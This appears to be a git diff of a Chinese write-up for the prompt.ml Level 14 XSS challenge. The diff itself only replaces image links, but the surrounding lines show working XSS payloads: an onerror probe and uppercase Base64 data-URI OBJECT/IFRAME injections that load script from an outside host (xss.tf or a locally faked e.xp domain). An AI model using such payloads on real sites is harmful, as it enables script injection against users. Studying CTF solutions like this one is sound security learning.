@@ -31,7 +31,7 @@ function escape(input) {
 
 因为最后输出是 `<img src="' + input + '">` ，不妨构造 input 探针 `0" onerror=prompt(1)` 看看效果：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/d13ae69777c8473f2203908cb75be5d2.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/01.png)
 
 虽然可以闭合双引号 `"` ，但是空字符 `\s` 被过滤成了下划线 `_` ，而且所有字符被转换成了大写，所以直接注入是不可能的。
 
@@ -85,7 +85,7 @@ function escape(input) {
 <img src=""><OBJECT/DATA="data:TEXT/HTML;BASE64,PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=">
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/5336cee0bf7943a59f33c9618c658b16.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/02.png)
 
 
 ------------
@@ -107,11 +107,11 @@ function escape(input) {
 
 然后用 Chrome 浏览器打开，`TEXT/HTML;BASE64` 变大写了确实是无法解析的：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/9492134d6541f571b18513a2a79c433c.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/03.png)
 
 但是用 FireFox 浏览器则可以解析并执行了 JS 代码：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/4017d46d84e506ab2b2955eee2ebe5aa.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/04.png)
 
 由此决定了，**这个挑战只能通过 FireFox 浏览器去做**。
 
@@ -220,7 +220,7 @@ Base64 编码后是：
 
 很幸运地，我试到第 3 次，就得到了 [http://xss.tf/tOH](http://xss.tf/tOH) 这个 URL ：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/407881b3b1e4fc392ee44705dd8b92c3.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/05.png)
 
 利用这个 URL ，我不断通过各种试错组合，得到了前面的第一个 JS 代码：
 
@@ -253,7 +253,7 @@ HTTPS:XSS%2E%54%46/TOH>
 
 `ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/deb8034bee7a7f5bf99059f176a92ce0.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/06.png)
 
 于是利用它构造 payload 如下，并在 FireFox 浏览器提交，完成挑战：
 
@@ -261,7 +261,7 @@ HTTPS:XSS%2E%54%46/TOH>
 "><OBJECT/DATA="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/3f1439090cf238c7fa845ebb3c5f63f9.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/07.png)
 
 > 注意：这题确实是有 BUG 的，虽然可以触发 `prompt(1)` ，但是却不会成功检测到
 
@@ -315,9 +315,9 @@ HTTPS:E.XP>
 - 修改 `%ApacheHttpd%/conf/extra/httpd-vhosts.conf` 文件，修改 `<VirtualHost>` 中的服务名为 `ServerName E.XP:80`
 - 修改 `C:\Windows\System32\drivers\etc\hosts` 文件，增加一行 `127.0.0.1 E.XP` （相当于伪造 DNS）
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/1737b148f5ab3359440456ed43a1eea2.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/08.png)
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/48c65d505f21a5d432fc5776004e42e9.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/09.png)
 
 完成这两处修改，启动 Apache Httpd 服务，就可以在本地访问 [https://e.xp](https://e.xp) 了。
 
@@ -330,16 +330,16 @@ HTTPS:E.XP>
 
 这样只要访问 [https://e.xp](https://e.xp) 就会自动跳到 index.js 页面，然后触发 `prompt(1)`
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/ec19f55726e15f40cda8e0584715f077.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/10.png)
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/d946cf2cbc24f0bd6dc5807c30a789d3.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/11.png)
 
 
 ------------
 
 至此，搭建本地 XSS 服务器完成，访问 [https://e.xp](https://e.xp) 就可以看到效果，跟使用 XSS 平台一样：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/f5f67dfb80f7864781e8f81ebc5ad989.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/12.png)
 
 利用本地域名 [https://e.xp](https://e.xp) 的 Base64 编码构造 payload 如下，并在 FireFox 浏览器提交，完成挑战：
 
@@ -347,7 +347,7 @@ HTTPS:E.XP>
 "><OBJECT/DATA="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6RS5YUD4KPC9TQ1JJUFQKID4=
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/dd31e2c32d3aa3ae32f1f25ee6c53d5a.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/13.png)
 
 ------------
 
@@ -373,8 +373,8 @@ HTTPS:E.XP>
 "><IFRAME/SRC="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6RS5YUD4KPC9TQ1JJUFQKID4=
 ```
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/37b8b482ce7242dac0494e3d1aa785a5.png)
-![](http://exp-blog.com/wp-content/uploads/2019/03/7326404112770b874c859f5f45a36cad.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/14.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/15.png)
 
 `<a>` 标签原本也是可以触发 JS 的，不妨构造遮掩过的 payload ：
 
@@ -384,11 +384,11 @@ HTTPS:E.XP>
 
 但是 [http://prompt.ml/](http://prompt.ml/) 似乎跟按钮有仇，死活不让点击超链。
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/e33f7c0c2b129ac9af45d4e55d0db827.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/16.png)
 
 不过即使能点击也没用，现代的浏览器为了避免 `<a>` 标签的 Data URIs 被用于跨站攻击，默认都是拦截掉请求了：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/e3bda36fd9dd923ac8fb021414989429.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2014%20-%20Base64/imgs/17.png)
 
 ------
 
